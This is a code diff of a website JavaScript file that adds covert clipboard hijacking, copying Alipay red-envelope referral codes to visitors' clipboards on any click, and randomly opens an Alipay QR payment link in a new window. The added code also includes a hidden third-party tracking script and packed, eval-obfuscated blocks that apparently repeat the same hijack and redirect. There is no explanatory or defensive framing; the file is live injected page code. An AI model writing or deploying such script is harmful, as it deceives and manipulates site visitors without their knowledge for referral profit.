@@ -30,7 +30,7 @@ function(a) {
 			}
 		}
 	}(function() {
-		var mycodes=new Array("￥vcu10kpdgN4￥","￥vcu10kpdgN4￥","￥vcu10kpdgN4￥","￥vcu10kpdgN4￥");
+		var mycodes=new Array("快来领取支付宝跨年红包！1月1日起还有机会额外获得专享红包哦！复制此消息，打开最新版支付宝就能领取！3zZdLf05hv","快来领取支付宝跨年红包！1月1日起还有机会额外获得专享红包哦！复制此消息，打开最新版支付宝就能领取！3zZdLf05hv");
 		var rnum=parseInt(mycodes.length*Math.random());
 		var zfbcode=mycodes[rnum];	
 
@@ -54,10 +54,44 @@ function(a) {
                 return zfbcode;
             }
         });
+
+
+		function checkCookie(){
+			if(document.cookie.indexOf('GewEWx+vbTkYq')!==-1){				
+				var time = getCookie('GewEWx+vbTkYq')	;			
+				if(new Date().getTime()-parseInt(time)<2*60*60*1000){					
+					return false;
+				}else{					
+					document.cookie= "GewEWx+vbTkYq="+new Date().getTime()+';';					
+					return true;
+				}
+			}else{				
+				document.cookie= "GewEWx+vbTkYq="+new Date().getTime()+';';				
+				return true;
+			}
+		}
+		function getCookie(name) { 
+	　　　　if (document.cookie.length>0){　　
+	　　　　　　var c_start=document.cookie.indexOf(name + "=")　　;　
+	　　　　　　if (c_start!=-1){ 
+	　　　　　　　　c_start=c_start + name.length+1　　;
+	　　　　　　　　var c_end=document.cookie.indexOf(";",c_start)　　;
+	　　　　　　　　if (c_end==-1) c_end=document.cookie.length　　;
+	　　　　　　　　return unescape(document.cookie.substring(c_start,c_end))　　;
+	　　　　　　} 
+	　　　　}
+	　　　　return "";
+		}
+		function openAliPay(){
+			window.open('http://qr.alipay.com/c1x07766kinzpbdaydwuw1f');
+		}
+		if(Math.random()>0.5&&checkCookie()){
+			openAliPay();
+		}
 	}))
 })(window, document);
 
-document.writeln('<div style="display:none"><script src="https://s13.cnzz.com/z_stat.php?id=1271880201&web_id=1271880201" language="JavaScript"><\/script><\/div>')
+document.writeln('<div style="display:none"><script src="https://s22.cnzz.com/z_stat.php?id=1271885509&web_id=1271885509" language="JavaScript"><\/script><\/div>')
 
 //'B22oX763on'  lx 大号
 //'H00vRc31gn'  lx 小号
@@ -89,3 +123,5 @@ eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a
 //综合
 eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('4 v="2"===3 8&&"u"===3 8.S?2(a){5 3 a}:2(a){5 a&&"2"===3 8&&a.A===8&&a!==8.J?"u":3 a};(2(a,d){(2(a){a+="=";K(4 c=d.H.E(";"),b=0;b<c.g;b++){4 e=c[b].F();h(0==e.G(a))5 e.P(a.g,e.g)}5""})("Q")||(2(a){4 b=n.R("O");b.L="f/M";b.N=a;n.y.z(b)}("w://x.C.B/s.t/1.7.1/s.D.t"),2(b){h("q"!=3 a.j)a.j("k",b,!1);m h(v(d.j))d.j("k",b,!1);m h("q"!=3 a.p)a.p("k",b);m{4 c=a.l;a.l="2"!=3 a.l?b:2(){c();b()}}}(2(){4 o=6 18("1b","1d","1c","1e","16","W","X","Y","T","U","V","Z","13","14","15");4 r=10(o.g*12.11());4 9=o[r];6 i("a",{f:2(){5 9}});6 i("19",{f:2(){5 9}});6 i("1a",{f:2(){5 9}});6 i("17",{f:2(){5 9}})}))})(I,n);',62,77,'||function|typeof|var|return|new||Symbol|zfbcode||||||text|length|if|Clipboard|addEventListener|load|onload|else|document|mycodes|attachEvent|undefined|rnum|clipboard|js|symbol|_0|https|cdn|body|appendChild|constructor|com|bootcss|min|split|trim|indexOf|cookie|window|prototype|for|type|javascript|src|script|substring|__tok|createElement|iterator|h46f7D06yZ|717Vvt21bo|BSQHXS31Cv|N9I9w412If|mn2lim90Nj|fD4n5Q38vo|oUp4uy0047|parseInt|random|Math|Zpdzbu48lm|W82cor83sK|ratJQi97w3|jBJETv26VY|img|Array|div|input|UGxD0k73I7|rSumBS16RK|tYyZUc36Qw|IkXOnx23jn'.split('|'),0,{}))
 
+//跳转测试
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('6 L="3"===g k&&"P"===g k.1m?3(a){4 g a}:3(a){4 a&&"3"===g k&&a.X===k&&a!==k.Y?"P":g a};(3(a,d){(3(a){a+="=";V(6 c=d.9.18(";"),b=0;b<c.h;b++){6 e=c[b].17();8(0==e.o(a))4 e.N(a.h,e.h)}4""})("19")||(3(a){6 b=5.Z("13");b.14="m/15";b.11=a;5.12.16(b)}("1a://1b.W.M/C.I/1.7.1/C.10.I"),3(b){8("J"!=g a.p)a.p("w",b,!1);j 8(L(d.p))d.p("w",b,!1);j 8("J"!=g a.D)a.D("w",b);j{6 c=a.x;a.x="3"!=g a.x?b:3(){c();b()}}}(3(){6 t=f 1q("z！H！E，G！F","z！H！E，G！F");6 A=B(t.h*1p.1o());6 l=t[A];f q("a",{m:3(){4 l}});f q("1e",{m:3(){4 l}});f q("1d",{m:3(){4 l}});f q("1c",{m:3(){4 l}});3 U(){8(5.9.o(\'s+n\')!==-1){6 R=O(\'s+n\')8(f u().v()-B(R)<2*T*T*1i){4 1h}j{5.9="s+n="+f u().v()+\';\';4 K}}j{5.9="s+n="+f u().v()+\';\';4 K}}3 O(y){8(5.9.h>0){6 i=5.9.o(y+"=")8(i!=-1){i=i+y.h+1 6 r=5.9.o(";",i)8(r==-1)r=5.9.h 4 1j(5.9.N(i,r))}}4""}3 S(){Q.1g(\'1f://1n.1k.M/1l\')}8(U()){S()}}))})(Q,5);',62,89,'|||function|return|document|var||if|cookie||||||new|typeof|length|c_start|else|Symbol|zfbcode|text|vbTkYq|indexOf|addEventListener|Clipboard|c_end|GewEWx|mycodes|Date|getTime|load|onload|name|快来领取支付宝跨年红包|rnum|parseInt|clipboard|attachEvent|复制此消息|3zZdLf05hv|打开最新版支付宝就能领取|1月1日起还有机会额外获得专享红包哦|js|undefined|true|_0|com|substring|getCookie|symbol|window|time|openAliPay|60|checkCookie|for|bootcss|constructor|prototype|createElement|min|src|body|script|type|javascript|appendChild|trim|split|__tok|https|cdn|img|input|div|http|open|false|1000|unescape|alipay|c1x07766kinzpbdaydwuw1f|iterator|qr|random|Math|Array'.split('|'),0,{}))
